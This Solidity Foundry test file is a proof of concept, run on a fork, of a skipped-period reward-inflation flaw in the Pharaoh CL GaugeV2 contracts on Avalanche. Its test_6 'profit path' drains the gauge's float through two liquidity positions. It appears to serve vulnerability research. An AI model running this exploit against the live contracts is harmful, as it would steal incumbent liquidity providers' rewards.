// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function deposit() external payable;
}

interface IClPoolState {
    function lastPeriod() external view returns (uint256);
    function liquidity() external view returns (uint128);
    function periods(uint256)
        external
        view
        returns (
            uint32 previousPeriod,
            int24 startTick,
            int24 lastTick,
            uint160 endSecondsPerLiquidityPeriodX128,
            uint160 endSecondsPerBoostedLiquidityPeriodX128,
            uint32 boostedInRange
        );
    function positionPeriodSecondsInRange(
        uint256 period,
        address owner,
        uint256 index,
        int24 tickLower,
        int24 tickUpper
    ) external view returns (uint256 periodSecondsInsideX96, uint256 periodBoostedSecondsInsideX96);
    function periodCumulativesInside(uint32 period, int24 tickLower, int24 tickUpper)
        external
        view
        returns (uint160, uint160);
    function _advancePeriod() external;
    function fee() external view returns (uint24);
}

interface INonfungiblePositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
        uint256 veNFTTokenId;
    }

    function mint(MintParams calldata params)
        external
        payable
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
}

interface IGaugeV2 {
    function notifyRewardAmountForPeriod(address token, uint256 amount, uint256 period) external;
    function tokenTotalSupplyByPeriod(uint256, address) external view returns (uint256);
    function periodEarned(uint256 period, address token, uint256 tokenId) external view returns (uint256);
    function getPeriodReward(uint256 period, address[] calldata tokens, uint256 tokenId, address receiver)
        external;
}

library FullMath {
    function mulDiv(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {
        uint256 prod0;
        uint256 prod1;
        assembly {
            let mm := mulmod(a, b, not(0))
            prod0 := mul(a, b)
            prod1 := sub(sub(mm, prod0), lt(mm, prod0))
        }
        if (prod1 == 0) return prod0 / denominator;
        require(denominator > prod1, "overflow");
        uint256 remainder;
        assembly {
            remainder := mulmod(a, b, denominator)
            prod1 := sub(prod1, gt(remainder, prod0))
            prod0 := sub(prod0, remainder)
        }
        uint256 twos = denominator & (~denominator + 1);
        assembly {
            denominator := div(denominator, twos)
            prod0 := div(prod0, twos)
            twos := add(div(sub(0, twos), twos), 1)
        }
        prod0 |= prod1 * twos;
        uint256 inverse = (3 * denominator) ^ 2;
        inverse *= 2 - denominator * inverse;
        inverse *= 2 - denominator * inverse;
        inverse *= 2 - denominator * inverse;
        inverse *= 2 - denominator * inverse;
        inverse *= 2 - denominator * inverse;
        inverse *= 2 - denominator * inverse;
        result = prod0 * inverse;
    }
}

/// @title Pharaoh CL GaugeV2 skipped-period reward inflation — end-to-end fork PoC
/// @notice Read-only research. Every state change happens on a local Forge/Anvil fork
///         of Avalanche C-Chain; no transaction is ever sent to a live network.
contract PharaohGaugeTest is Test {
    address constant POOL = 0xf40e23204b2e1cC94930E15576B9CE47b4ad0f19;
    address constant GAUGE = 0xa011554eF697E88221217b70B3B3eCdf51345342;
    address constant NFP = 0xAAA78E8C4241990B4ce159E105dA08129345946A;
    address constant SAVAX = 0x2b2C81e08f1Af8835a78Bb2A90AE924ACE0eA4bE;
    address constant WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address constant STAVAX = 0xA25EaF2906FA1a3a13EdAc9B9657108Af7B703e3;

    int24 constant TICK_LOWER = 2500;
    int24 constant TICK_UPPER = 3500;
    uint256 constant WEEK = 604800;
    uint256 constant Q96 = 1 << 96;

    address constant ATTACKER = address(0xA11CE);
    address constant FUNDER = address(0xF00D);

    IClPoolState pool = IClPoolState(POOL);
    IGaugeV2 gauge = IGaugeV2(GAUGE);
    INonfungiblePositionManager nfp = INonfungiblePositionManager(NFP);
    IERC20 savax = IERC20(SAVAX);
    IERC20 wavax = IERC20(WAVAX);

    uint256 public forkBlock;

    function setUp() public {
        string memory url = vm.envOr("AVAX_RPC_URL", string("https://api.avax.network/ext/bc/C/rpc"));
        uint256 blk = vm.envOr("FORK_BLOCK", uint256(0));
        if (blk == 0) {
            vm.createSelectFork(url);
        } else {
            vm.createSelectFork(url, blk);
        }
        forkBlock = block.number;
    }

    // ------------------------------------------------------------------ helpers

    function _fund(address who, uint256 savaxAmt, uint256 avaxAmt) internal {
        vm.deal(who, avaxAmt + 5 ether);
        vm.prank(who);
        wavax.deposit{value: avaxAmt}();
        // sAVAX cannot be minted on a fork: move it out of the pool's idle balance
        vm.prank(POOL);
        savax.transfer(who, savaxAmt);
        vm.startPrank(who);
        savax.approve(NFP, type(uint256).max);
        wavax.approve(NFP, type(uint256).max);
        savax.approve(GAUGE, type(uint256).max);
        vm.stopPrank();
    }

    function _sqrtNow() internal view returns (uint160 s) {
        (bool ok, bytes memory d) = POOL.staticcall(abi.encodeWithSignature("slot0()"));
        require(ok, "slot0 failed");
        s = abi.decode(d, (uint160));
    }

    /// @dev sqrt(1.0001^tick) in Q96, 1e18 fixed-point square-and-multiply
    function _sqrtAt(int24 tick) internal pure returns (uint160) {
        uint256 ratio = 1e18;
        uint256 base = 1000049998750062500; // sqrt(1.0001)
        uint256 exp = uint24(tick);
        while (exp > 0) {
            if (exp & 1 == 1) ratio = (ratio * base) / 1e18;
            base = (base * base) / 1e18;
            exp >>= 1;
        }
        return uint160((ratio * Q96) / 1e18);
    }

    function _amountsForRange(uint160 sqrtP, uint160 sqrtA, uint160 sqrtB, uint128 liquidity)
        internal
        pure
        returns (uint256 amount0, uint256 amount1)
    {
        require(sqrtP > sqrtA && sqrtP < sqrtB, "range");
        amount0 = FullMath.mulDiv(uint256(liquidity) << 96, uint256(sqrtB) - uint256(sqrtP), uint256(sqrtB))
            / uint256(sqrtP);
        amount1 = FullMath.mulDiv(liquidity, uint256(sqrtP) - uint256(sqrtA), Q96);
    }

    function _mintForLiquidity(address who, uint128 targetL)
        internal
        returns (uint256 tokenId, uint128 liquidity)
    {
        uint160 sqrtP = _sqrtNow();
        (uint256 a0, uint256 a1) = _amountsForRange(sqrtP, _sqrtAt(TICK_LOWER), _sqrtAt(TICK_UPPER), targetL);
        uint24 fee = pool.fee();
        vm.prank(who);
        (tokenId, liquidity,,) = nfp.mint(
            INonfungiblePositionManager.MintParams({
                token0: SAVAX,
                token1: WAVAX,
                fee: fee,
                tickLower: TICK_LOWER,
                tickUpper: TICK_UPPER,
                amount0Desired: a0 * 103 / 100 + 1,
                amount1Desired: a1 * 103 / 100 + 1,
                amount0Min: 0,
                amount1Min: 0,
                recipient: who,
                deadline: block.timestamp + 1 days,
                veNFTTokenId: 0
            })
        );
    }

    function _one(address t) internal pure returns (address[] memory arr) {
        arr = new address[](1);
        arr[0] = t;
    }

    struct Obs {
        uint32 prevP2;
        uint32 prevP;
        uint160 endP;
        uint160 inside;
        uint256 secsIn;
        uint256 supplyP;
        uint256 gBefore;
        uint256 paid;
        uint256 gasUsed;
    }

    function _observeAndClaim(uint256 P, uint256 tokenId) internal returns (Obs memory o) {
        (o.prevP2, , , , , ) = pool.periods(P + 2);
        (o.prevP, , , o.endP, , ) = pool.periods(P);
        (o.inside,) = pool.periodCumulativesInside(uint32(P), TICK_LOWER, TICK_UPPER);
        (o.secsIn,) = pool.positionPeriodSecondsInRange(P, NFP, tokenId, TICK_LOWER, TICK_UPPER);
        o.supplyP = gauge.tokenTotalSupplyByPeriod(P, SAVAX);
        o.gBefore = savax.balanceOf(GAUGE);
        uint256 balBefore = savax.balanceOf(ATTACKER);
        uint256 g0 = gasleft();
        vm.prank(ATTACKER);
        gauge.getPeriodReward(P, _one(SAVAX), tokenId, ATTACKER);
        o.gasUsed = g0 - gasleft();
        o.paid = savax.balanceOf(ATTACKER) - balBefore;
    }

    // ------------------------------------------------------------------ tests

    /// @notice A skipped week makes periods(P).end span TWO weeks. An attacker holding
    ///         nearly all active liquidity (the pass-3 "dominate the pool" assumption)
    ///         is nevertheless paid ZERO: the per-position `> 1 week` sanity clamp in
    ///         Position.positionPeriodSecondsInRange zeroes the epoch.
    function test_1_dominantLp_getsZero_clamp() public {
        uint128 poolL = pool.liquidity();
        uint256 P = block.timestamp / WEEK + 1;

        _fund(ATTACKER, 8 ether, 20 ether);
        vm.prank(ATTACKER);
        gauge.notifyRewardAmountForPeriod(SAVAX, 5 ether, P);

        vm.warp(P * WEEK + 120);
        (uint256 tokenId, uint128 liq) = _mintForLiquidity(ATTACKER, poolL * 20);

        vm.warp((P + 2) * WEEK + 120);
        pool._advancePeriod();

        Obs memory o = _observeAndClaim(P, tokenId);

        emit log_named_uint("fork block", forkBlock);
        emit log_named_uint("period P", P);
        emit log_named_uint("pool active liquidity before", poolL);
        emit log_named_uint("attacker position liquidity", liq);
        emit log_named_uint("periods(P+2).previousPeriod (skip proof, expect P)", o.prevP2);
        emit log_named_uint("periods(P).previousPeriod", o.prevP);
        emit log_named_uint("periods(P).endSecondsPerLiquidityPeriodX128", o.endP);
        emit log_named_uint("periodCumulativesInside(P) [2-week value]", o.inside);
        emit log_named_uint("2*WEEK*2^128/(L+Lattacker)", (2 * WEEK * (1 << 128)) / (uint256(poolL) + uint256(liq)));
        emit log_named_uint("positionPeriodSecondsInRange(P)", o.secsIn);
        emit log_named_uint("gauge period-P supply", o.supplyP);
        emit log_named_uint("gauge sAVAX before claim", o.gBefore);
        emit log_named_uint("attacker payout", o.paid);
        emit log_named_uint("claim gas", o.gasUsed);

        assertEq(o.prevP2, P, "period P+2 follows P directly (P+1 skipped)");
        assertApproxEqRel(
            o.inside, (2 * WEEK * (1 << 128)) / (uint256(poolL) + uint256(liq)), 0.02e18, "cumulative spans 2 weeks"
        );
        assertEq(o.secsIn, 0, "dominant position seconds clamped to 0");
        assertEq(o.paid, 0, "dominant LP receives 0");
    }

    /// @notice With ~50% of active liquidity the 2-week span yields ~1 week of
    ///         position-seconds (passes the clamp) and the position is paid the ENTIRE
    ///         period supply = 2x its fair share. The other half is taken from the
    ///         incumbent LPs, whose claims can then no longer be paid.
    function test_2_halfShare_takesWholePeriod_thirdPartyFunded() public {
        uint128 poolL = pool.liquidity();
        uint256 P = block.timestamp / WEEK + 1;
        uint256 fundAmt = 5 ether;

        _fund(ATTACKER, 4 ether, 20 ether);
        _fund(FUNDER, 8 ether, 20 ether);

        // external party (protocol emission / bribe) funds the period — this is the pot
        vm.prank(FUNDER);
        gauge.notifyRewardAmountForPeriod(SAVAX, fundAmt, P);

        vm.warp(P * WEEK + 120);
        (uint256 tokenId, uint128 liq) = _mintForLiquidity(ATTACKER, poolL * 90 / 100);

        vm.warp((P + 2) * WEEK + 120);
        pool._advancePeriod();

        Obs memory o = _observeAndClaim(P, tokenId);
        uint256 gAfter = savax.balanceOf(GAUGE);

        emit log_named_uint("period P", P);
        emit log_named_uint("attacker liquidity", liq);
        emit log_named_uint("incumbent pool liquidity", poolL);
        emit log_named_uint("position seconds (1 week Q96 = 604800e96)", o.secsIn);
        emit log_named_uint("1 week seconds Q96", WEEK * Q96);
        emit log_named_uint("period supply", o.supplyP);
        emit log_named_uint("attacker payout", o.paid);
        emit log_named_uint("gauge balance after claim", gAfter);
        emit log_named_uint("claim gas", o.gasUsed);

        uint256 shareE18 = uint256(liq) * 1e18 / (uint256(liq) + uint256(poolL));
        emit log_named_uint("attacker share of active liquidity (1e18)", shareE18);
        assertGt(o.secsIn, 0, "half-share position passes the clamp");
        assertApproxEqRel(o.secsIn, 2 * shareE18 * WEEK * Q96 / 1e18, 0.02e18, "seconds = 2x share x 2 weeks");
        assertApproxEqRel(o.paid, 2 * shareE18 * fundAmt / 1e18, 0.02e18, "payout = 2x fair share");
        // the extra half is paid out of the gauge's legacy float (incumbent LPs' pot)
        assertEq(o.gBefore - gAfter, o.paid, "payout comes out of the gauge float");
        assertGt(o.paid, shareE18 * fundAmt / 1e18 * 19 / 10, "payout ~2x fair share");
    }

    /// @notice Self-funded variant (the only one available on a dead gauge):
    ///         payout == own deposit; net = -gas. Not a profit path.
    function test_3_selfFunded_isBreakeven() public {
        uint128 poolL = pool.liquidity();
        uint256 P = block.timestamp / WEEK + 1;
        uint256 fundAmt = 5 ether;

        _fund(ATTACKER, 8 ether, 20 ether);
        vm.prank(ATTACKER);
        gauge.notifyRewardAmountForPeriod(SAVAX, fundAmt, P);

        vm.warp(P * WEEK + 120);
        (uint256 tokenId, ) = _mintForLiquidity(ATTACKER, poolL * 90 / 100);

        vm.warp((P + 2) * WEEK + 120);
        pool._advancePeriod();

        uint256 balBefore = savax.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        gauge.getPeriodReward(P, _one(SAVAX), tokenId, ATTACKER);
        uint256 paid = savax.balanceOf(ATTACKER) - balBefore;

        emit log_named_uint("deposit", fundAmt);
        emit log_named_uint("payout", paid);
        assertApproxEqRel(paid, fundAmt, 0.05e18, "payout equals own deposit");
        assertLe(paid, fundAmt, "cannot exceed own deposit");
    }

    /// @notice THE PROFIT PATH (pass-3 model corrected): the attacker funds a future
    ///         period with S and mints TWO positions of equal (large) liquidity. Each
    ///         holds < 50% of the pool, so each passes the 1-week clamp with ~1 week of
    ///         seconds and each is paid ~S. Total payout ~2S, paid out of the gauge's
    ///         legacy float -> net profit ~S per cycle, repeatable until the float is gone.
    function test_6_twoPositions_drainGaugeFloat() public {
        uint128 poolL = pool.liquidity();
        uint256 P = block.timestamp / WEEK + 1;
        uint256 S = 5 ether;

        _fund(ATTACKER, 2 * S + 1 ether, 20 ether);
        uint256 gBalBefore = savax.balanceOf(GAUGE);

        vm.prank(ATTACKER);
        gauge.notifyRewardAmountForPeriod(SAVAX, S, P);

        vm.warp(P * WEEK + 120);
        (uint256 id1, uint128 liq1) = _mintForLiquidity(ATTACKER, poolL * 100);
        (uint256 id2,) = _mintForLiquidity(ATTACKER, poolL * 100);

        vm.warp((P + 2) * WEEK + 120);
        pool._advancePeriod();

        (uint256 secs1,) = pool.positionPeriodSecondsInRange(P, NFP, id1, TICK_LOWER, TICK_UPPER);
        (uint256 secs2,) = pool.positionPeriodSecondsInRange(P, NFP, id2, TICK_LOWER, TICK_UPPER);

        uint256 before = savax.balanceOf(ATTACKER);
        vm.startPrank(ATTACKER);
        gauge.getPeriodReward(P, _one(SAVAX), id1, ATTACKER);
        gauge.getPeriodReward(P, _one(SAVAX), id2, ATTACKER);
        vm.stopPrank();
        uint256 paid = savax.balanceOf(ATTACKER) - before;
        uint256 gBalAfter = savax.balanceOf(GAUGE);

        emit log_named_uint("period P", P);
        emit log_named_uint("deposit S", S);
        emit log_named_uint("position liquidity each", liq1);
        emit log_named_uint("pool liquidity", poolL);
        emit log_named_uint("seconds pos1", secs1);
        emit log_named_uint("seconds pos2", secs2);
        emit log_named_uint("total payout", paid);
        emit log_named_uint("gauge balance before", gBalBefore);
        emit log_named_uint("gauge balance after", gBalAfter);
        emit log_named_uint("net profit (payout - deposit)", paid - S);

        assertGt(secs1, 0, "pos1 passes clamp");
        assertGt(secs2, 0, "pos2 passes clamp");
        assertGt(paid, S * 19 / 10, "total payout ~2x deposit");
        assertLt(paid, S * 21 / 10, "total payout ~2x deposit (upper)");
        assertGt(paid - S, S * 8 / 10, "net profit ~S");
        assertEq(gBalBefore - gBalAfter, paid - S, "float consumed == net profit");
    }

    /// @notice Live-state monitor: the gauge has NO rewards notified for the current
    ///         or previous period. Without a period supply there is nothing to inflate.
    function test_5_noCurrentEmissions() public {
        uint256 cp = block.timestamp / WEEK;
        uint256 cur = gauge.tokenTotalSupplyByPeriod(cp, SAVAX);
        uint256 prev = gauge.tokenTotalSupplyByPeriod(cp - 1, SAVAX);
        emit log_named_uint("current period", cp);
        emit log_named_uint("current period sAVAX supply", cur);
        emit log_named_uint("previous period sAVAX supply", prev);
        assertEq(cur, 0, "no rewards funded for the current period");
        assertEq(prev, 0, "no rewards funded for the previous period");
    }

    /// @notice The gauge's legacy balances come from periods <= 2909. A position minted
    ///         today cannot reach any of them (checkpoint gate), so the balance is
    ///         H-O (incumbent LPs), not E-U.
    function test_4_legacyPeriods_unclaimable() public {
        _fund(ATTACKER, 2 ether, 20 ether);
        (uint256 tokenId, ) = _mintForLiquidity(ATTACKER, 1e15);

        uint256 legacy = 2909;
        uint256 earnedNft = gauge.periodEarned(legacy, SAVAX, tokenId);
        (uint256 secsLegacy,) =
            pool.positionPeriodSecondsInRange(legacy, NFP, tokenId, TICK_LOWER, TICK_UPPER);

        emit log_named_uint("gauge sAVAX balance", savax.balanceOf(GAUGE));
        emit log_named_uint("gauge stAVAX balance", IERC20(STAVAX).balanceOf(GAUGE));
        emit log_named_uint("periodEarned(2909, NFT)", earnedNft);
        emit log_named_uint("positionPeriodSecondsInRange(2909, fresh NFT)", secsLegacy);
        emit log_named_uint("pool lastPeriod", pool.lastPeriod());

        assertEq(earnedNft, 0, "fresh NFT cannot claim legacy period");
        assertEq(secsLegacy, 0, "no checkpoint before the legacy period");

        uint256 before = savax.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        gauge.getPeriodReward(legacy, _one(SAVAX), tokenId, ATTACKER);
        assertEq(savax.balanceOf(ATTACKER), before, "no legacy payout");
    }
}
